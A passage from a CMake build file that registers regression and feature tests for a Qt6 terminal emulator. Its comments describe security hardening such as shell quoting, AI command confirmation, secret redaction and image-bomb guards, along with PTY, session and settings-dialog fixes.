        TIMEOUT 10)

    # shellutils_whitelist — asserts the 0.7.57 /indie-review fix
    # (ANTS-1047) that switched shellQuote from a denylist regex to a
    # whitelist. Pre-fix, glob/redirection/bracket characters slipped
    # through unquoted; the test feeds each of the previously-missed
    # classes plus the existing happy path. See
    # tests/features/shellutils_whitelist/spec.md.
    add_executable(test_shellutils_whitelist
        tests/features/shellutils_whitelist/test_shellutils_whitelist.cpp
    )
    target_link_libraries(test_shellutils_whitelist PRIVATE Qt6::Core)
    target_include_directories(test_shellutils_whitelist PRIVATE src)
    target_compile_options(test_shellutils_whitelist PRIVATE
        -Wall -Wextra -Wpedantic
    )
    add_test(NAME shellutils_whitelist COMMAND test_shellutils_whitelist)
    set_tests_properties(shellutils_whitelist PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # ai_insert_command_sanitize — asserts the 0.7.12 /indie-review
    # OWASP LLM01+LLM02 fix: AI-suggested commands pass through
    # control-char strip + 4 KiB cap, AND the click handler gates the
    # insertCommand emit on a user confirmation dialog. See
    # tests/features/ai_insert_command_sanitize/spec.md.
    add_executable(test_ai_insert_command_sanitize
        tests/features/ai_insert_command_sanitize/test_ai_insert_command.cpp
        src/aidialog.cpp
    )
    target_link_libraries(test_ai_insert_command_sanitize PRIVATE
        Qt6::Core
        Qt6::Gui
        Qt6::Widgets
        Qt6::Network
    )
    target_include_directories(test_ai_insert_command_sanitize PRIVATE src)
    target_compile_options(test_ai_insert_command_sanitize PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_ai_insert_command_sanitize PRIVATE
        SRC_AI_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/aidialog.cpp"
    )
    add_test(NAME ai_insert_command_sanitize COMMAND test_ai_insert_command_sanitize)
    set_tests_properties(ai_insert_command_sanitize PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # claude_git_context_hook — installer source-grep test for the
    # UserPromptSubmit git-context hook. Asserts SettingsDialog's new
    # installClaudeGitContextHook writes the canonical script, targets
    # UserPromptSubmit in ~/.claude/settings.json, preserves existing
    # entries, refuses to clobber a corrupt settings file, and wires a
    # dedicated UI button. See tests/features/claude_git_context_hook/spec.md.
    add_executable(test_claude_git_context_installer
        tests/features/claude_git_context_hook/test_installer_grep.cpp
    )
    target_compile_options(test_claude_git_context_installer PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_claude_git_context_installer PRIVATE
        SRC_SETTINGSDIALOG_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/settingsdialog.cpp"
        SRC_SETTINGSDIALOG_H="${CMAKE_CURRENT_SOURCE_DIR}/src/settingsdialog.h"
        SRC_CONFIGPATHS_H="${CMAKE_CURRENT_SOURCE_DIR}/src/configpaths.h"
    )
    add_test(NAME claude_git_context_installer
             COMMAND test_claude_git_context_installer)
    set_tests_properties(claude_git_context_installer PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # claude_git_context_script — behavioral test of the bash script the
    # installer writes. Extracts the script body from settingsdialog.cpp
    # (single source of truth) and exercises it across five scenarios:
    # not-a-repo, git-missing, clean repo, dirty repo (1/1/1 counts),
    # CLAUDE_PROJECT_DIR override.
    add_test(NAME claude_git_context_script
             COMMAND bash "${CMAKE_CURRENT_SOURCE_DIR}/tests/features/claude_git_context_hook/test_script.sh")
    set_tests_properties(claude_git_context_script PROPERTIES
        LABELS "features;fast"
        TIMEOUT 30
        ENVIRONMENT "SRC_SETTINGSDIALOG_CPP=${CMAKE_CURRENT_SOURCE_DIR}/src/settingsdialog.cpp")

    # ai_context_redaction — OWASP LLM06 defense. Asserts the 14 secret
    # shapes in src/secretredact.h redact with the correct [REDACTED:<kind>]
    # label, negative controls (UUID, commit SHA, plain URLs, prose) pass
    # through verbatim, priority ordering puts sk-ant-… before legacy
    # sk-…, and AiDialog::sendRequest wires scrub() to both the terminal
    # context and the user message before either reaches the JSON body.
    # See tests/features/ai_context_redaction/spec.md.
    add_executable(test_ai_context_redaction
        tests/features/ai_context_redaction/test_ai_context_redaction.cpp
    )
    target_link_libraries(test_ai_context_redaction PRIVATE
        Qt6::Core
    )
    target_include_directories(test_ai_context_redaction PRIVATE src)
    target_compile_options(test_ai_context_redaction PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_ai_context_redaction PRIVATE
        SRC_AIDIALOG_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/aidialog.cpp"
    )
    add_test(NAME ai_context_redaction COMMAND test_ai_context_redaction)
    set_tests_properties(ai_context_redaction PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # image_bomb_png_header_peek — regression guard for the 0.7.7 fix that
    # added QImageReader-based dimension peeks before QImage::loadFromData
    # on inline-image byte streams (OSC 1337 iTerm2 + Kitty APC PNG path).
    # Without the peek, a 1 KB compressed PNG declaring 100 000 × 100 000
    # forces a multi-GB decode allocation before the post-decode
    # MAX_IMAGE_DIM guard fires. Static source inspection — a runtime
    # image-bomb test would either succeed (no signal) or hang the test
    # process (no signal either), neither useful in CI.
    add_executable(test_image_bomb_png_header_peek
        tests/features/image_bomb_png_header_peek/test_image_bomb.cpp
    )
    target_compile_definitions(test_image_bomb_png_header_peek PRIVATE
        SRC_TERMINALGRID_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/terminalgrid.cpp"
        SRC_TERMINALGRID_HEADER="${CMAKE_CURRENT_SOURCE_DIR}/src/terminalgrid.h"
    )
    target_compile_options(test_image_bomb_png_header_peek PRIVATE
        -Wall -Wextra -Wpedantic
    )
    add_test(NAME image_bomb_png_header_peek
             COMMAND test_image_bomb_png_header_peek)
    set_tests_properties(image_bomb_png_header_peek PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # ssh_control_master — locks the SSH ControlMaster auto-multiplexing
    # contract on SshBookmark::toSshCommand(bool). When controlMaster=true,
    # the built command must carry -o ControlMaster=auto / -o ControlPath=
    # <resolved $HOME>/.ssh/cm-%r@%h:%p / -o ControlPersist=10m, placed
    # before the [user@]host destination. The default call
    # (controlMaster=false) must be byte-identical to the pre-0.7.1
    # legacy command so existing bookmarks keep working.
    # See tests/features/ssh_control_master/spec.md.
    add_executable(test_ssh_control_master
        tests/features/ssh_control_master/test_ssh_control_master.cpp
        src/sshdialog.cpp
    )
    target_link_libraries(test_ssh_control_master PRIVATE
        Qt6::Core
        Qt6::Gui
        Qt6::Widgets  # sshdialog.h transitively includes QDialog
    )
    target_include_directories(test_ssh_control_master PRIVATE src)
    target_compile_options(test_ssh_control_master PRIVATE
        -Wall -Wextra -Wpedantic
    )
    set_target_properties(test_ssh_control_master PROPERTIES
        AUTOMOC ON)
    add_test(NAME ssh_control_master
             COMMAND test_ssh_control_master)
    set_tests_properties(ssh_control_master PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # threaded_ptywrite_gating — locks the 0.6.35 regression fix. Asserts
    # no `if (m_pty)` / `&& m_pty)` gate on any ptyWrite() call site in
    # TerminalWidget — m_pty is null on the worker path, so a bare-
    # pointer gate silently drops every write, which is exactly how the
    # keystroke-not-echoing bug shipped in 0.6.34.
    add_executable(test_threaded_ptywrite_gating
        tests/features/threaded_ptywrite_gating/test_threaded_ptywrite_gating.cpp
    )
    target_link_libraries(test_threaded_ptywrite_gating PRIVATE
        Qt6::Core
    )
    target_include_directories(test_threaded_ptywrite_gating PRIVATE src)
    target_compile_options(test_threaded_ptywrite_gating PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_threaded_ptywrite_gating PRIVATE
        SRC_TERMINALWIDGET_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/terminalwidget.cpp"
    )
    add_test(NAME threaded_ptywrite_gating
             COMMAND test_threaded_ptywrite_gating)
    set_tests_properties(threaded_ptywrite_gating PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # threaded_resize_synchronous — locks the source-level invariant that
    # every invokeMethod(m_vtStream, "resize", ...) uses
    # Qt::BlockingQueuedConnection. A silent regression to QueuedConnection
    # would introduce a 1-frame flicker that only shows under load. Pure
    # source-grep test; same pattern as shift_enter_bracketed_paste.
    add_executable(test_threaded_resize_synchronous
        tests/features/threaded_resize_synchronous/test_threaded_resize_synchronous.cpp
    )
    target_link_libraries(test_threaded_resize_synchronous PRIVATE
        Qt6::Core
    )
    target_include_directories(test_threaded_resize_synchronous PRIVATE src)
    target_compile_options(test_threaded_resize_synchronous PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_threaded_resize_synchronous PRIVATE
        SRC_TERMINALWIDGET_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/terminalwidget.cpp"
        SRC_VTSTREAM_HEADER_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/vtstream.h"
    )
    add_test(NAME threaded_resize_synchronous
             COMMAND test_threaded_resize_synchronous)
    set_tests_properties(threaded_resize_synchronous PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # pty_closefrom — 0.7.27 fix. Locks the post-fork close-inherited-FDs
    # path: must use close_range(2) (Linux 5.9+) with a getrlimit-bounded
    # fallback, not the prior hard-coded fd<1024 loop that leaked FDs on
    # systemd / container default RLIMIT_NOFILE profiles. Source-grep
    # test re-reads src/ptyhandler.cpp. See
    # tests/features/pty_closefrom/spec.md.
    add_executable(test_pty_closefrom
        tests/features/pty_closefrom/test_pty_closefrom.cpp
    )
    target_compile_options(test_pty_closefrom PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_pty_closefrom PRIVATE
        SRC_PTY_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/ptyhandler.cpp"
    )
    add_test(NAME pty_closefrom COMMAND test_pty_closefrom)
    set_tests_properties(pty_closefrom PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # pty_write_eagain_queue — 0.7.27 fix. Locks the EAGAIN-queue +
    # write-side QSocketNotifier path that replaced the silent-drop
    # break in Pty::write. Source-grep test against ptyhandler.{h,cpp}
    # — see tests/features/pty_write_eagain_queue/spec.md.
    add_executable(test_pty_write_eagain_queue
        tests/features/pty_write_eagain_queue/test_pty_write_eagain_queue.cpp
    )
    target_compile_options(test_pty_write_eagain_queue PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_pty_write_eagain_queue PRIVATE
        SRC_PTY_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/ptyhandler.cpp"
        SRC_PTY_H_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/ptyhandler.h"
    )
    add_test(NAME pty_write_eagain_queue COMMAND test_pty_write_eagain_queue)
    set_tests_properties(pty_write_eagain_queue PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # audit_per_tool_timeout — 0.7.28 fix. Locks `int timeoutMs` field
    # on AuditCheck, the per-check m_timeout->start() use site, the
    # parameterised "Timed out (Ns)" warning, and at least one
    # calibration override > 30 s for the slow-tool IDs (cppcheck,
    # semgrep, osv_scanner, trufflehog, clang_tidy, clazy). See
    # tests/features/audit_per_tool_timeout/spec.md.
    add_executable(test_audit_per_tool_timeout
        tests/features/audit_per_tool_timeout/test_audit_per_tool_timeout.cpp
    )
    target_compile_options(test_audit_per_tool_timeout PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_audit_per_tool_timeout PRIVATE
        SRC_AUDIT_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/auditdialog.cpp"
        SRC_AUDIT_H_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/auditdialog.h"
        SRC_AUDIT_ENGINE_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/auditengine.cpp"
        SRC_AUDIT_ENGINE_H_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/auditengine.h"
    )
    add_test(NAME audit_per_tool_timeout COMMAND test_audit_per_tool_timeout)
    set_tests_properties(audit_per_tool_timeout PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # audit_incremental_output_drain — 0.7.28 fix. Locks the
    # readyReadStandardOutput / readyReadStandardError drain wiring,
    # the m_currentOutput / m_currentError buffers, the
    # MAX_TOOL_OUTPUT_BYTES cap, the per-check buffer reset, and the
    # kill-on-overflow path. See
    # tests/features/audit_incremental_output_drain/spec.md.
    add_executable(test_audit_incremental_output_drain
        tests/features/audit_incremental_output_drain/test_audit_incremental_output_drain.cpp
    )
    target_compile_options(test_audit_incremental_output_drain PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_audit_incremental_output_drain PRIVATE
        SRC_AUDIT_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/auditdialog.cpp"
        SRC_AUDIT_H_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/auditdialog.h"
    )
    add_test(NAME audit_incremental_output_drain
        COMMAND test_audit_incremental_output_drain)
    set_tests_properties(audit_incremental_output_drain PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # audit_tool_crash_distinct — 0.7.28 fix. Locks the named
    # exitCode / exitStatus parameters on onCheckFinished, the
    # QProcess::CrashExit branch, the warning emission with a
    # crash/exit message, and the Severity::Info demotion. See
    # tests/features/audit_tool_crash_distinct/spec.md.
    add_executable(test_audit_tool_crash_distinct
        tests/features/audit_tool_crash_distinct/test_audit_tool_crash_distinct.cpp
    )
    target_compile_options(test_audit_tool_crash_distinct PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_audit_tool_crash_distinct PRIVATE
        SRC_AUDIT_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/auditdialog.cpp"
    )
    add_test(NAME audit_tool_crash_distinct
        COMMAND test_audit_tool_crash_distinct)
    set_tests_properties(audit_tool_crash_distinct PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # audit_dedup_96bit — 0.7.29 fix. Locks computeDedup's widened
    # 24-hex-char prefix (96 bits up from 64), the isSuppressed
    # backward-compat helper that matches legacy 16-char keys, the
    # render-pipeline use of the helper, and the
    # m_suppressionReasons mirror update in saveSuppression. See
    # tests/features/audit_dedup_96bit/spec.md.
    add_executable(test_audit_dedup_96bit
        tests/features/audit_dedup_96bit/test_audit_dedup_96bit.cpp
    )
    target_compile_options(test_audit_dedup_96bit PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_audit_dedup_96bit PRIVATE
        SRC_AUDIT_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/auditdialog.cpp"
        SRC_AUDIT_H_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/auditdialog.h"
        SRC_AUDIT_ENGINE_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/auditengine.cpp"
        SRC_AUDIT_ENGINE_H_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/auditengine.h"
    )
    add_test(NAME audit_dedup_96bit COMMAND test_audit_dedup_96bit)
    set_tests_properties(audit_dedup_96bit PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # audit_regex_dos_watchdog — 0.7.29 fix. Locks the
    # isCatastrophicRegex shape-rejection helper, its invocation at
    # the dropIfMatches / loadAllowlist user-pattern entry points,
    # the PCRE2 `(*LIMIT_MATCH=N)` step-budget cap, and the
    # qWarning rejection path. See
    # tests/features/audit_regex_dos_watchdog/spec.md.
    add_executable(test_audit_regex_dos_watchdog
        tests/features/audit_regex_dos_watchdog/test_audit_regex_dos_watchdog.cpp
    )
    target_compile_options(test_audit_regex_dos_watchdog PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_audit_regex_dos_watchdog PRIVATE
        SRC_AUDIT_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/auditdialog.cpp"
        SRC_AUDIT_H_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/auditdialog.h"
        SRC_AUDIT_ENGINE_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/auditengine.cpp"
        SRC_AUDIT_ENGINE_H_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/auditengine.h"
    )
    add_test(NAME audit_regex_dos_watchdog
        COMMAND test_audit_regex_dos_watchdog)
    set_tests_properties(audit_regex_dos_watchdog PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # audit_sarif_suppressions — 0.7.29 fix. Locks the
    # m_suppressionReasons map declaration, its load/save
    # population, the SARIF v2.1.0 §3.34 result.suppressions[]
    # array emission, and removal of the suppress-and-skip
    # filter from exportSarif. See
    # tests/features/audit_sarif_suppressions/spec.md.
    add_executable(test_audit_sarif_suppressions
        tests/features/audit_sarif_suppressions/test_audit_sarif_suppressions.cpp
    )
    target_compile_options(test_audit_sarif_suppressions PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_audit_sarif_suppressions PRIVATE
        SRC_AUDIT_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/auditdialog.cpp"
        SRC_AUDIT_H_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/auditdialog.h"
    )
    add_test(NAME audit_sarif_suppressions
        COMMAND test_audit_sarif_suppressions)
    set_tests_properties(audit_sarif_suppressions PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # session_sha256_checksum — 0.7.30 fix. Locks the V4 envelope that
    # wraps qCompress output with [SHEC magic][version][SHA-256][len].
    # The hash must be computed at serialize time, recomputed at restore
    # time, and a mismatch must short-circuit the restore. See
    # tests/features/session_sha256_checksum/spec.md.
    add_executable(test_session_sha256_checksum
        tests/features/session_sha256_checksum/test_session_sha256_checksum.cpp
    )
    target_compile_options(test_session_sha256_checksum PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_session_sha256_checksum PRIVATE
        SRC_SESSION_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/sessionmanager.cpp"
        SRC_SESSION_H_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/sessionmanager.h"
    )
    add_test(NAME session_sha256_checksum
        COMMAND test_session_sha256_checksum)
    set_tests_properties(session_sha256_checksum PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # session_qcompress_length_guard — 0.7.30 fix. Locks the
    # 4-byte big-endian uncompressed-length pre-flight that runs
    # BEFORE qUncompress, so a crafted file claiming 500 MB doesn't
    # trigger a 500 MB allocation that the post-hoc cap could only
    # catch after the damage was done. See
    # tests/features/session_qcompress_length_guard/spec.md.
    add_executable(test_session_qcompress_length_guard
        tests/features/session_qcompress_length_guard/test_session_qcompress_length_guard.cpp
    )
    target_compile_options(test_session_qcompress_length_guard PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_session_qcompress_length_guard PRIVATE
        SRC_SESSION_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/sessionmanager.cpp"
        SRC_SESSION_H_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/sessionmanager.h"
    )
    add_test(NAME session_qcompress_length_guard
        COMMAND test_session_qcompress_length_guard)
    set_tests_properties(session_qcompress_length_guard PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # session_cell_loop_stream_status — 0.7.30 fix. Locks the
    # readCell `-> bool` return + `if (!readCell(...))` short-circuit
    # at every call site, plus the per-codepoint status check inside
    # readCombining's inner loop. Pre-fix, a truncated stream
    # silently wrote uninitialized fg/bg/flags into the grid. See
    # tests/features/session_cell_loop_stream_status/spec.md.
    add_executable(test_session_cell_loop_stream_status
        tests/features/session_cell_loop_stream_status/test_session_cell_loop_stream_status.cpp
    )
    target_compile_options(test_session_cell_loop_stream_status PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_session_cell_loop_stream_status PRIVATE
        SRC_SESSION_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/sessionmanager.cpp"
    )
    add_test(NAME session_cell_loop_stream_status
        COMMAND test_session_cell_loop_stream_status)
    set_tests_properties(session_cell_loop_stream_status PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # persistence_post_rename_chmod — 0.7.31 fix. Locks the
    # belt-and-suspenders post-rename chmod at every save site that
    # writes a file containing API keys / scrollback / bearer tokens.
    # Pre-fix, fd-only chmod relied on rename(2) preserving perms,
    # which fails on FAT/exFAT/SMB/NFS/copy-unlink fallback. See
    # tests/features/persistence_post_rename_chmod/spec.md.
    add_executable(test_persistence_post_rename_chmod
        tests/features/persistence_post_rename_chmod/test_persistence_post_rename_chmod.cpp
    )
    target_compile_options(test_persistence_post_rename_chmod PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_persistence_post_rename_chmod PRIVATE
        SRC_CONFIG_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/config.cpp"
        SRC_SESSIONMANAGER_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/sessionmanager.cpp"
        SRC_SETTINGSDIALOG_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/settingsdialog.cpp"
    )
    add_test(NAME persistence_post_rename_chmod
        COMMAND test_persistence_post_rename_chmod)
    set_tests_properties(persistence_post_rename_chmod PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # concurrent_writer_lock — 0.7.31 fix. Locks the ConfigWriteLock
    # RAII guard around config.json + ~/.claude/settings.json saves.
    # Two simultaneously-running Ants instances writing the same
    # config previously raced on rename(2); the lock serializes them.
    # See tests/features/concurrent_writer_lock/spec.md.
    add_executable(test_concurrent_writer_lock
        tests/features/concurrent_writer_lock/test_concurrent_writer_lock.cpp
    )
    target_compile_options(test_concurrent_writer_lock PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_concurrent_writer_lock PRIVATE
        SRC_CONFIG_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/config.cpp"
        SRC_CLAUDEALLOWLIST_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/claudeallowlist.cpp"
        SRC_SETTINGSDIALOG_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/settingsdialog.cpp"
    )
    target_include_directories(test_concurrent_writer_lock PRIVATE src)
    target_link_libraries(test_concurrent_writer_lock PRIVATE Qt6::Core)
    add_test(NAME concurrent_writer_lock
        COMMAND test_concurrent_writer_lock)
    set_tests_properties(concurrent_writer_lock PROPERTIES
        LABELS "features;fast"
        TIMEOUT 15)

    # secureio_configbackup_split — 0.7.31 refactor. Locks the split
    # of secureio.h into perms-only and configbackup.h owning rotation
    # + ConfigWriteLock. Asserts no helper drifts back into the wrong
    # header and every caller pulls the include it actually needs.
    # See tests/features/secureio_configbackup_split/spec.md.
    add_executable(test_secureio_configbackup_split
        tests/features/secureio_configbackup_split/test_secureio_configbackup_split.cpp
    )
    target_compile_options(test_secureio_configbackup_split PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_secureio_configbackup_split PRIVATE
        SRC_SECUREIO_H_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/secureio.h"
        SRC_CONFIGBACKUP_H_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/configbackup.h"
        SRC_CONFIG_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/config.cpp"
        SRC_CLAUDEALLOWLIST_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/claudeallowlist.cpp"
        SRC_SETTINGSDIALOG_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/settingsdialog.cpp"
    )
    add_test(NAME secureio_configbackup_split
        COMMAND test_secureio_configbackup_split)
    set_tests_properties(secureio_configbackup_split PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # settings_dependency_gating — 0.7.32 fix. Locks the toggled→
    # setEnabled wiring on the three master checkboxes (m_aiEnabled,
    # m_autoColorScheme, m_quakeMode) plus the one-shot sync call so
    # the initial widget state matches the loaded config without
    # waiting for the user to toggle. See
    # tests/features/settings_dependency_gating/spec.md.
    add_executable(test_settings_dependency_gating
        tests/features/settings_dependency_gating/test_settings_dependency_gating.cpp
    )
    target_compile_options(test_settings_dependency_gating PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_settings_dependency_gating PRIVATE
        SRC_SETTINGSDIALOG_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/settingsdialog.cpp"
    )
    add_test(NAME settings_dependency_gating
        COMMAND test_settings_dependency_gating)
    set_tests_properties(settings_dependency_gating PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # settings_profile_cancel_rollback — 0.7.32 fix. Locks the
    # pending-state pair (m_pendingProfiles + m_pendingActiveProfile)
    # and that Save/Delete/Load mutate ONLY pending state, never
    # m_config directly. applySettings is the single commit point.
    # See tests/features/settings_profile_cancel_rollback/spec.md.
    add_executable(test_settings_profile_cancel_rollback
        tests/features/settings_profile_cancel_rollback/test_settings_profile_cancel_rollback.cpp
    )
    target_compile_options(test_settings_profile_cancel_rollback PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_settings_profile_cancel_rollback PRIVATE
        SRC_SETTINGSDIALOG_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/settingsdialog.cpp"
        SRC_SETTINGSDIALOG_H_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/settingsdialog.h"
    )
    add_test(NAME settings_profile_cancel_rollback
        COMMAND test_settings_profile_cancel_rollback)
    set_tests_properties(settings_profile_cancel_rollback PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # settings_restore_defaults — 0.7.32 fix. Locks the
    # "Restore Defaults (<TabName> tab)" buttons across General,
    # Appearance, Terminal, AI tabs, and that the reset slots
    # mutate widget state only (no direct m_config-> writes). See
    # tests/features/settings_restore_defaults/spec.md.
    add_executable(test_settings_restore_defaults
        tests/features/settings_restore_defaults/test_settings_restore_defaults.cpp
    )
    target_compile_options(test_settings_restore_defaults PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_settings_restore_defaults PRIVATE
        SRC_SETTINGSDIALOG_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/settingsdialog.cpp"
    )
    add_test(NAME settings_restore_defaults
        COMMAND test_settings_restore_defaults)
    set_tests_properties(settings_restore_defaults PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # plugin_manifest_safety — 0.7.33 fix. Locks the 1 MiB manifest
    # cap (OOM surface), QDir::NoSymLinks, canonical plugin root +
    # per-entry canonical-containment check (symlink escape). See
    # tests/features/plugin_manifest_safety/spec.md.
    add_executable(test_plugin_manifest_safety
        tests/features/plugin_manifest_safety/test_plugin_manifest_safety.cpp
    )
    target_compile_options(test_plugin_manifest_safety PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_plugin_manifest_safety PRIVATE
        SRC_PLUGINMANAGER_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/pluginmanager.cpp"
    )
    add_test(NAME plugin_manifest_safety
        COMMAND test_plugin_manifest_safety)
    set_tests_properties(plugin_manifest_safety PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # claude_bg_tasks_button — 0.7.38 feature. Background-tasks
    # status-bar button + live-tail dialog for Claude Code's
    # `run_in_background:true` Bash/Task launches. User request
    # 2026-04-25. Locks the parser shape (run_in_background +
    # backgroundTaskId), the tracker's QFileSystemWatcher + signal,
    # the button's hide-when-empty contract, the wire-up to the
    # showBgTasksDialog click handler, and the dialog's reuse of the
    # 0.7.37 scroll-preservation pattern. See spec.md.
    add_executable(test_claude_bg_tasks_button
        tests/features/claude_bg_tasks_button/test_claude_bg_tasks_button.cpp
    )
    target_compile_options(test_claude_bg_tasks_button PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_claude_bg_tasks_button PRIVATE
        SRC_BGTASKS_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/claudebgtasks.cpp"
        SRC_BGTASKS_H_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/claudebgtasks.h"
        SRC_BGDIALOG_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/claudebgtasksdialog.cpp"
        SRC_BGDIALOG_H_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/claudebgtasksdialog.h"
        SRC_MAINWINDOW_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.cpp"
        SRC_CMAKELISTS_PATH="${CMAKE_CURRENT_SOURCE_DIR}/CMakeLists.txt"
        SRC_CLAUDE_INTEGRATION_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/claudeintegration.cpp"
        SRC_CLAUDE_INTEGRATION_H_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/claudeintegration.h"
        SRC_CLAUDESTATUSWIDGETS_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/claudestatuswidgets.cpp"
    )
    add_test(NAME claude_bg_tasks_button
        COMMAND test_claude_bg_tasks_button)
    set_tests_properties(claude_bg_tasks_button PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # claude_state_dot_palette — 0.7.39 feature. User request
    # 2026-04-27: a single round dot per tab in a state-specific
    # colour, with grey for Idle, and the same palette extended to
    # the bottom status-bar Claude label. Locks the unified helper,
    # the eight-state palette, the uniform dot geometry (no outline,
    # no per-state radius), the helper-driven status-bar applier, and
    # the Auditing plumbing through ClaudeTabTracker::ShellState. See
    # tests/features/claude_state_dot_palette/spec.md.
    add_executable(test_claude_state_dot_palette
        tests/features/claude_state_dot_palette/test_claude_state_dot_palette.cpp
    )
    target_compile_options(test_claude_state_dot_palette PRIVATE
        -Wall -Wextra -Wpedantic
    )
